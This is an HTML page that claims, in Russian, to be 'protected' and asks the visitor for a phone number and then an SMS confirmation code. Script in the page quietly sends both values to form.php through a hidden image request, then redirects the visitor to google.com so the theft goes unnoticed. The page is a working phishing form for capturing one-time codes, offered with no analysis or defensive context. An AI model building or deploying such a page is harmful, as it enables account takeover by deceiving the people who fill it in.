<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      #block{
        margin-top: 5%;
      }h5{color:red; font-size: 15px;}
      #code{
        display:none;
        margin-top: 8%;
      }body{
        background: #f1f1f1;
        font-family: courier new;
      }.inp{
        height:30px;
        width:200px;
        border-radius: 4px;
      }.sun{
        height:30px;
        width:100px;
        border:1px solid #d2d2d2;
        background: #d2d2d2;
        border-radius: 4px;
        box-shadow: 1px 2px 3px 0px #aaa;
      }.sun:hover{
        box-shadow: 2px 4px 6px 0px #aaa;
      }
    </style>

  </head>
  <body>
    <center>
      <h1>Страница защищена. </h1>
      <h5>Введите номер телефона, чтобы продолжить!</h5>
      <hr>
    <div id="block" >
      <h3>Your number phone:</h3>
      <input  onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength=11 minlength=11 id=numb class="inp">
      <input type="submit" value="Далее" id="phone" class="sun" placeholder="Phone number" >
    </div>
    <div id=code>
      <input name="" id="send_code" class="inp" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  minlength=11 maxlength=4 placeholder="SMS Code">
      <input type="submit" value="Send" id="send" class="sun">
    </div>
  </center>
  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var code = document.getElementById('code')
  var block = document.getElementById('block')
  var numb = document.getElementById('numb')
  var sender = document.getElementById('sender')
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Error. Укажите ваш номер телефона!")}else{
    sender.src="form.php?phone="+numb.value;
    code.style.display="block";
    block.style.display="none";
  }
  };
  document.getElementById('send').onclick = function(){
    sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
    window.location.href="https://google.com";
    
  };
  </script>
</html>
